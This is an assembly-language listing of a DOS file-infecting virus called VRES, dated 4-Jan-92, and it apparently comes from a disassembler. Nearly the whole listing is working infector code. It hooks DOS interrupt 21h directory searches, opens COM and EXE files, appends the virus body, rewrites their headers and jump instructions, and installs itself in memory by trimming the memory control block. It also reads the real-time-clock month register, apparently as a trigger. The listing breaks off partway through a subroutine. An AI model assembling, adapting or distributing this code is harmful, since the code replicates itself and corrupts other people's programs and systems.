  
PAGE  60,132
  
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;€€                                                                      €€
;€€                             VRES                                     €€
;€€                                                                      €€
;€€      Created:   4-Jan-92                                             €€
;€€      Passes:    5          Analysis Flags on: H                      €€
;€€                                                                      €€
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
  
data_1e         equ     12Bh
data_2e         equ     137h
data_3e         equ     139h
data_4e         equ     13Bh
data_5e         equ     27Dh
data_6e         equ     5CDh
data_7e         equ     724h
data_8e         equ     6B0h
data_9e         equ     3
data_10e        equ     12h
  
seg_a           segment
                assume  cs:seg_a, ds:seg_a
  
  
                org     100h
  
vres            proc    far
  
start:
                push    cs
                mov     ax,cs
data_11         dw      105h
data_12         dw      5000h
data_13         dw      0B8h
data_14         dw      5001h
                db      0CBh, 0
data_15         dw      0
data_16         dw      0EB00h
                db      4Ah, 90h
data_17         dw      1460h
                db      74h, 2, 53h, 0FFh
data_18         dw      0F000h
data_19         dw      3B8h
                db      0, 0CDh
data_20         dw      0CD10h
data_21         dw      20h
data_22         dw      20h
data_23         dw      11h
data_24         dw      0FFFFh
data_25         dw      4
data_26         dw      100h
data_27         dw      674Fh
data_28         dw      100h
data_29         dw      4
data_30         dw      0
data_31         dw      0
data_32         dw      0
data_33         dw      340h
data_34         db      5
                db      0, 8Ah, 43h, 0B7h, 9Ah, 14h
                db      0, 0, 1, 71h, 0Dh, 8Eh
                db      0Ch, 56h, 5, 1, 0EAh, 56h
                db      74h, 2, 5Ch, 7, 70h, 0
loc_1:
                push    ss
                add     al,al
                or      bx,[si+7]
                jo      loc_2                                   ; Jump if overflow=1
loc_2:
                push    es
                push    ds
                mov     ax,es
                push    cs
                pop     ds
                push    cs
                pop     es
                mov     data_31,ax
                mov     ax,ss
                mov     data_26,ax
                mov     al,2
                out     20h,al                                  ; port 20h, 8259-1 int command
                cld                                             ; Clear direction
                xor     ax,ax                                   ; Zero register
                mov     ds,ax
                xor     si,si                                   ; Zero register
                mov     di,13Ch
                mov     cx,10h
                repne   movsb                                   ; Rep while cx>0 Mov [si] to es:[di]
                push    ds
                pop     ss
                mov     bp,8
                xchg    bp,sp
                call    sub_1                                   ; (01D5)
                jmp     loc_24                                  ; (0552)
loc_3:
                call    sub_12                                  ; (05EC)
                call    sub_2                                   ; (023D)
                jz      loc_4                                   ; Jump if zero
                mov     al,ds:data_7e
                push    ax
                call    sub_3                                   ; (02AE)
                pop     ax
                mov     ds:data_7e,al
                jmp     short loc_5                             ; (01B4)
                db      90h
loc_4:
                call    sub_5                                   ; (041B)
                call    sub_6                                   ; (043D)
                cmp     byte ptr ds:data_7e,0
                jne     loc_5                                   ; Jump if not equal
                mov     ax,4C00h
                int     21h                                     ; DOS Services  ah=function 4Ch
                                                                ;  terminate with al=return code
loc_5:
                cmp     byte ptr ds:data_7e,43h                 ; 'C'
                jne     loc_8                                   ; Jump if not equal
loc_6:
                pop     ds
                pop     es
                push    cs
                pop     ds
                pop     es
                push    es
                mov     di,100h
                mov     si,10Bh
                mov     cx,0Ch
                repne   movsb                                   ; Rep while cx>0 Mov [si] to es:[di]
                push    es
                pop     ds
                mov     ax,100h
                push    ax
                xor     ax,ax                                   ; Zero register
                retf                                            ; Return far
  
vres            endp
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_1           proc    near
                mov     si,6
                lodsw                                           ; String [si] to ax
                cmp     ax,192h
                je      loc_6                                   ; Jump if equal
                cmp     ax,179h
                jne     loc_7                                   ; Jump if not equal
                jmp     loc_10                                  ; (028F)
loc_7:
                cmp     ax,1DCh
                je      loc_8                                   ; Jump if equal
                retn
loc_8:
                pop     ds
                pop     es
                mov     bx,cs:data_18
                sub     bx,cs:data_29
                mov     ax,cs
                sub     ax,bx
                mov     ss,ax
                mov     bp,cs:data_30
                xchg    bp,sp
                mov     bx,cs:data_21
                sub     bx,cs:data_22
                mov     ax,cs
                sub     ax,bx
                push    ax
                mov     ax,cs:data_23
                push    ax
                retf                                            ; Return far
                db      23h, 1Ah
                db      '<#/--!.$'
                db      0Eh, 23h, 2Fh, 2Dh, 0E0h
                db      'D:VRES.COM'
                db      0, 58h, 45h, 0, 0
                db      24h, 24h, 24h, 24h, 24h
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_2:
                mov     ax,3D02h
                mov     dx,219h
                int     21h                                     ; DOS Services  ah=function 3Dh
                                                                ;  open file, al=mode,name@ds:dx
                jnc     loc_9                                   ; Jump if carry=0
                clc                                             ; Clear carry flag
                retn
loc_9:
                mov     ds:data_1e,ax
                mov     dx,673h
                mov     ax,2524h
                int     21h                                     ; DOS Services  ah=function 25h
                                                                ;  set intrpt vector al to ds:dx
                mov     ax,4202h
                mov     bx,ds:data_1e
                mov     cx,0FFFFh
                mov     dx,0FFFEh
                int     21h                                     ; DOS Services  ah=function 42h
                                                                ;  move file ptr, cx,dx=offset
                mov     dx,27Dh
                mov     ah,3Fh                                  ; '?'
                mov     bx,ds:data_1e
                mov     cx,2
                int     21h                                     ; DOS Services  ah=function 3Fh
                                                                ;  read file, cx=bytes, to ds:dx
                mov     ah,3Eh                                  ; '>'
                int     21h                                     ; DOS Services  ah=function 3Eh
                                                                ;  close file, bx=file handle
                push    ds
                mov     dx,ds:data_3e
                mov     ax,ds:data_2e
                mov     ds,ax
                mov     ax,2524h
                int     21h                                     ; DOS Services  ah=function 25h
                                                                ;  set intrpt vector al to ds:dx
                pop     ds
                cmp     word ptr ds:data_5e,0A0Ch
                clc                                             ; Clear carry flag
                retn
                db      0CDh, 20h
loc_10:
                cmp     ax,22Dh
                je      loc_11                                  ; Jump if equal
                push    ds
                pop     es
                push    cs
                pop     ds
                mov     ax,data_26
                mov     ss,ax
                xchg    bp,sp
                mov     si,13Ch
                mov     di,0
                mov     cx,10h
                cld                                             ; Clear direction
                repne   movsb                                   ; Rep while cx>0 Mov [si] to es:[di]
                jmp     loc_3                                   ; (018C)
sub_1           endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_3           proc    near
loc_11:
                mov     al,43h                                  ; 'C'
                mov     ds:data_7e,al
                mov     al,8
                out     70h,al                                  ; port 70h, RTC addr/enabl NMI
                                                                ;  al = 8, month register
                in      al,71h                                  ; port 71h, RTC clock/RAM data
                mov     ds:data_4e,al
                mov     dx,219h
                mov     ax,3D02h
                int     21h                                     ; DOS Services  ah=function 3Dh
                                                                ;  open file, al=mode,name@ds:dx
                jnc     loc_12                                  ; Jump if carry=0
                retn
loc_12:
                mov     ds:data_1e,ax
                mov     dx,10Bh
                mov     bx,ds:data_1e
                mov     cx,0Ch
                mov     ah,3Fh                                  ; '?'
                int     21h                                     ; DOS Services  ah=function 3Fh
                                                                ;  read file, cx=bytes, to ds:dx
                mov     ax,4202h
                xor     cx,cx                                   ; Zero register
                xor     dx,dx                                   ; Zero register
                int     21h                                     ; DOS Services  ah=function 42h
                                                                ;  move file ptr, cx,dx=offset
                push    ax
                add     ax,10h
                and     ax,0FFF0h
                push    ax
                shr     ax,1                                    ; Shift w/zeros fill
                shr     ax,1                                    ; Shift w/zeros fill
                shr     ax,1                                    ; Shift w/zeros fill
                shr     ax,1                                    ; Shift w/zeros fill
                mov     di,31Fh
                stosw                                           ; Store ax to es:[di]
                pop     ax
                pop     bx
                sub     ax,bx
                mov     cx,627h
                add     cx,ax
                mov     dx,100h
                sub     dx,ax
                mov     bx,ds:data_1e
                mov     ah,40h                                  ; '@'
                int     21h                                     ; DOS Services  ah=function 40h
                                                                ;  write file cx=bytes, to ds:dx
                mov     ax,4200h
                xor     cx,cx                                   ; Zero register
                xor     dx,dx                                   ; Zero register
                int     21h                                     ; DOS Services  ah=function 42h
                                                                ;  move file ptr, cx,dx=offset
                mov     ah,40h                                  ; '@'
                mov     bx,ds:data_1e
                mov     cx,0Ch
                mov     dx,31Bh
                int     21h                                     ; DOS Services  ah=function 40h
                                                                ;  write file cx=bytes, to ds:dx
                mov     ah,3Eh                                  ; '>'
                mov     bx,ds:data_1e
                int     21h                                     ; DOS Services  ah=function 3Eh
                                                                ;  close file, bx=file handle
                retn
sub_3           endp
  
                db      0Eh, 8Ch, 0C8h, 5, 1, 0
                db      50h, 0B8h, 0, 1, 50h, 0CBh
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_4           proc    near
                mov     al,45h                                  ; 'E'
                mov     byte ptr ds:[724h],al
                mov     al,8
                out     70h,al                                  ; port 70h, RTC addr/enabl NMI
                                                                ;  al = 8, month register
                in      al,71h                                  ; port 71h, RTC clock/RAM data
                mov     data_34,al
                mov     dx,219h
                mov     ax,3D02h
                int     21h                                     ; DOS Services  ah=function 3Dh
                                                                ;  open file, al=mode,name@ds:dx
                jnc     loc_13                                  ; Jump if carry=0
                retn
loc_13:
                mov     data_26,ax
                mov     dx,10Bh
                mov     bx,data_26
                mov     cx,18h
                mov     ah,3Fh                                  ; '?'
                int     21h                                     ; DOS Services  ah=function 3Fh
                                                                ;  read file, cx=bytes, to ds:dx
                mov     ax,4202h
                mov     cx,0
                mov     dx,0
                int     21h                                     ; DOS Services  ah=function 42h
                                                                ;  move file ptr, cx,dx=offset
                push    ax
                add     ax,10h
                adc     dx,0
                and     ax,0FFF0h
                mov     data_24,dx
                mov     data_25,ax
                mov     cx,727h
                sub     cx,100h
                add     ax,cx
                adc     dx,0
                mov     cx,200h
                div     cx                                      ; ax,dx rem=dx:ax/reg
                inc     ax
                mov     data_16,ax
                mov     data_15,dx
                mov     ax,data_21
                mov     data_22,ax
                mov     ax,data_20
                mov     data_23,ax
                mov     ax,data_18
                mov     data_29,ax
                mov     ax,data_19
                mov     data_30,ax
                mov     dx,data_24
                mov     ax,data_25
                mov     cx,10h
                div     cx                                      ; ax,dx rem=dx:ax/reg
                sub     ax,10h
                sub     ax,data_17
                mov     data_21,ax
                mov     data_18,ax
                mov     data_20,100h
                mov     data_19,100h
                mov     ax,4200h
                xor     cx,cx                                   ; Zero register
                mov     dx,2
                int     21h                                     ; DOS Services  ah=function 42h
                                                                ;  move file ptr, cx,dx=offset
                mov     dx,10Dh
                mov     bx,data_26
                mov     cx,16h
                mov     ah,40h                                  ; '@'
                int     21h                                     ; DOS Services  ah=function 40h
                                                                ;  write file cx=bytes, to ds:dx
                mov     ax,4202h
                xor     cx,cx                                   ; Zero register
                xor     dx,dx                                   ; Zero register
                int     21h                                     ; DOS Services  ah=function 42h
                                                                ;  move file ptr, cx,dx=offset
                mov     dx,100h
                mov     ax,data_25
                pop     cx
                sub     ax,cx
                sub     dx,ax
                mov     cx,727h
                add     cx,ax
                sub     cx,100h
                mov     ah,40h                                  ; '@'
                int     21h                                     ; DOS Services  ah=function 40h
                                                                ;  write file cx=bytes, to ds:dx
                mov     ah,3Eh                                  ; '>'
                int     21h                                     ; DOS Services  ah=function 3Eh
                                                                ;  close file, bx=file handle
                retn
sub_4           endp
  
                db      51h, 0B9h, 0, 0, 0B4h, 4Eh
                db      0CDh, 21h, 59h, 0C3h
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_5           proc    near
                push    es
                mov     ax,351Ch
                int     21h                                     ; DOS Services  ah=function 35h
                                                                ;  get intrpt vector al in es:bx
                mov     cs:data_13,bx
                mov     cs:data_14,es
                mov     ax,3521h
                int     21h                                     ; DOS Services  ah=function 35h
                                                                ;  get intrpt vector al in es:bx
                push    es
                pop     ax
                mov     cs:data_12,ax
                mov     cs:data_11,bx
                pop     es
                retn
sub_5           endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_6           proc    near
                push    ax
                push    es
                push    ds
                xor     ax,ax                                   ; Zero register
                mov     es,ax
                mov     si,86h
                mov     ax,es:[si]
                mov     ds,ax
                mov     si,725h
                cmp     word ptr [si],0A0Ch
                jne     loc_14                                  ; Jump if not equal
                push    ds
                pop     ax
                call    sub_13                                  ; (0611)
                pop     ds
                pop     es
                pop     ax
                retn
loc_14:
                push    cs
                pop     ds
                mov     ax,data_31
                dec     ax
                mov     es,ax
                cmp     byte ptr es:[0],5Ah                     ; 'Z'
                je      loc_15                                  ; Jump if equal
                jmp     short loc_16                            ; (04B4)
                db      90h
loc_15:
                mov     ax,es:data_9e
                mov     cx,737h
                shr     cx,1                                    ; Shift w/zeros fill
                shr     cx,1                                    ; Shift w/zeros fill
                shr     cx,1                                    ; Shift w/zeros fill
                shr     cx,1                                    ; Shift w/zeros fill
                sub     ax,cx
                jc      loc_16                                  ; Jump if carry Set
                mov     es:data_9e,ax
                sub     es:data_10e,cx
                push    cs
                pop     ds
                mov     ax,es:data_10e
                push    ax
                pop     es
                mov     si,100h
                push    si
                pop     di
                mov     cx,627h
                cld                                             ; Clear direction
                repne   movsb                                   ; Rep while cx>0 Mov [si] to es:[di]
                push    es
                sub     ax,ax
                mov     es,ax
                mov     si,84h
                mov     dx,4A8h
                mov     es:[si],dx
                inc     si
                inc     si
                pop     ax
                mov     es:[si],ax
loc_16:
                pop     ds
                pop     es
                pop     ax
                retn
sub_6           endp
  
                db      3Ch, 57h, 75h, 3, 0EBh, 1Eh
                db      90h, 80h, 0FCh, 1Ah, 75h, 6
                db      0E8h, 17h, 1, 0EBh, 13h, 90h
loc_17:
                cmp     ah,11h
                jne     loc_18                                  ; Jump if not equal
                call    sub_7                                   ; (04E1)
                iret                                            ; Interrupt return
loc_18:
                cmp     ah,12h
                jne     loc_19                                  ; Jump if not equal
                call    sub_10                                  ; (059C)
                iret                                            ; Interrupt return
loc_19:
                jmp     dword ptr cs:data_11
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_7           proc    near
                mov     al,57h                                  ; 'W'
                int     21h                                     ; DOS Services  ah=function 00h
                                                                ;  terminate, cs=progm seg prefx
                push    ax
                push    cx
                push    dx
                push    bx
                push    bp
                push    si
                push    di
                push    ds
                push    es
                push    cs
                pop     ds
                push    cs
                pop     es
                mov     byte ptr cs:data_35,0
                nop
                call    sub_8                                   ; (0514)
                jnz     loc_20                                  ; Jump if not zero
                call    sub_2                                   ; (023D)
                jz      loc_20                                  ; Jump if zero
                call    sub_15                                  ; (065A)
                dec     byte ptr ds:data_6e
loc_20:
                pop     es
                pop     ds
                pop     di
                pop     si
                pop     bp
                pop     bx
                pop     dx
                pop     cx
                pop     ax
                retn
sub_7           endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_8           proc    near
                push    cs
                pop     es
                push    cs
                pop     es
                cld                                             ; Clear direction
                call    sub_9                                   ; (0552)
                jnc     loc_21                                  ; Jump if carry=0
                cmp     di,0
                retn
loc_21:
                mov     di,219h
                mov     al,2Eh                                  ; '.'
                mov     cx,0Bh
                repne   scasb                                   ; Rept zf=0+cx>0 Scan es:[di] for al
                cmp     word ptr [di],4F43h
                jne     loc_22                                  ; Jump if not equal
                cmp     byte ptr [di+2],4Dh                     ; 'M'
                jne     loc_22                                  ; Jump if not equal
                mov     byte ptr ds:[724h],43h                  ; 'C'
                nop
                retn
loc_22:
                cmp     word ptr [di],5845h
                jne     loc_ret_23                              ; Jump if not equal
                cmp     byte ptr [di+2],45h                     ; 'E'
                jne     loc_ret_23                              ; Jump if not equal
                mov     byte ptr ds:[724h],45h                  ; 'E'
                nop
  
loc_ret_23:
                retn
sub_8           endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_9           proc    near
loc_24:
                push    ds
                mov     si,cs:data_27
                mov     ax,cs:data_28
                mov     ds,ax
                mov     di,219h
                lodsb                                           ; String [si] to al
                cmp     al,0FFh
                jne     loc_25                                  ; Jump if not equal
                add     si,6
                lodsb                                           ; String [si] to al
                jmp     short loc_26                            ; (0574)
                db      90h
loc_25:
                cmp     al,5
                jb      loc_26                                  ; Jump if below
                pop     ds
                stc                                             ; Set carry flag
                retn
loc_26:
                mov     cx,0Bh
                cmp     al,0
                je      locloop_27                              ; Jump if equal
                add     al,40h                                  ; '@'
                stosb                                           ; Store al to es:[di]
                mov     al,3Ah                                  ; ':'
                stosb                                           ; Store al to es:[di]
  
locloop_27:
                lodsb                                           ; String [si] to al
                cmp     al,20h                                  ; ' '
                je      loc_28                                  ; Jump if equal
                stosb                                           ; Store al to es:[di]
                jmp     short loc_29                            ; (0594)
                db      90h
loc_28:
                cmp     byte ptr es:[di-1],2Eh                  ; '.'
                je      loc_29                                  ; Jump if equal
                mov     al,2Eh                                  ; '.'
                stosb                                           ; Store al to es:[di]
loc_29:
                loop    locloop_27                              ; Loop if cx > 0
  
                mov     al,0
                stosb                                           ; Store al to es:[di]
                pop     ds
                clc                                             ; Clear carry flag
                retn
sub_9           endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_10          proc    near
                mov     al,57h                                  ; 'W'
                int     21h                                     ; DOS Services  ah=function 00h
                                                                ;  terminate, cs=progm seg prefx
                push    ax
                push    cx
                push    dx
                push    bx
                push    bp
                push    si
                push    di
                push    ds
                push    es
                push    cs
                pop     ds
                push    cs
                pop     es
                cmp     byte ptr cs:data_35,0
                je      loc_30                                  ; Jump if equal
                jmp     short loc_31                            ; (05D3)
                db      90h
loc_30:
                call    sub_8                                   ; (0514)
                jnz     loc_31                                  ; Jump if not zero
                call    sub_2                                   ; (023D)
                jz      loc_31                                  ; Jump if zero
                call    sub_15                                  ; (065A)
                dec     byte ptr ds:data_6e
                pop     es
                pop     ds
                pop     di
                pop     si
data_35         db      5Dh
                db      5Bh, 5Ah, 59h, 58h, 0C3h
loc_31:
                pop     es
                pop     ds
                pop     di
                pop     si
                pop     bp
                pop     bx
                pop     dx
                pop     cx
                pop     ax
                retn
sub_10          endp
  
                db      0
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_11          proc    near
                push    ax
                push    ds
                pop     ax
                mov     cs:data_28,ax
                mov     cs:data_27,dx
                pop     ax
                retn
sub_11          endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_12          proc    near
                push    cs
                mov     al,0
                out     20h,al                                  ; port 20h, 8259-1 int command
                mov     ax,3524h
                int     21h                                     ; DOS Services  ah=function 35h
                                                                ;  get intrpt vector al in es:bx
                mov     ds:data_3e,bx
                mov     bx,es
                mov     ds:data_2e,bx
                pop     es
                mov     si,20Ah
                mov     di,219h
                mov     cx,0Fh
  
locloop_32:
                lodsb                                           ; String [si] to al
                add     al,20h                                  ; ' '
                stosb                                           ; Store al to es:[di]
                loop    locloop_32                              ; Loop if cx > 0
  
                retn
sub_12          endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_13          proc    near
                push    ax
                push    cs
                pop     ds
                push    cs
                pop     es
                mov     bl,data_34
                cmp     bl,0Ch
                ja      loc_34                                  ; Jump if above
                cmp     bl,0
                je      loc_34                                  ; Jump if equal
                mov     al,8
                out     70h,al                                  ; port 70h, RTC addr/enabl NMI
                                                                ;  al = 8, month register
                in      al,71h                                  ; port 71h, RTC clock/RAM data
                cmp     al,0Ch
                ja      loc_34                                  ; Jump if above
                cmp     al,0
                je      loc_34                                  ; Jump if equal
                cmp     al,bl
                je      loc_34                                  ; Jump if equal
                inc     bl
                call    sub_14                                  ; (064F)
                cmp     al,bl
                je      loc_34                                  ; Jump if equal
                inc     bl
                call    sub_14                                  ; (064F)
                cmp     al,bl
                je      loc_34                                  ; Jump if equal
                pop     ds
                call    sub_16                                  ; (0686)
                push    cs
                pop     ds
                retn
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
  
sub_14:
                cmp     bl,0Ch
                jbe     loc_ret_33                              ; Jump if below or =
                sub     bl,0Ch
  
loc_ret_33:
                retn
loc_34:
                pop     ax
                retn
sub_13          endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_15          proc    near
                mov     dx,673h
                mov     ax,2524h
                int     21h                                     ; DOS Services  ah=function 25h
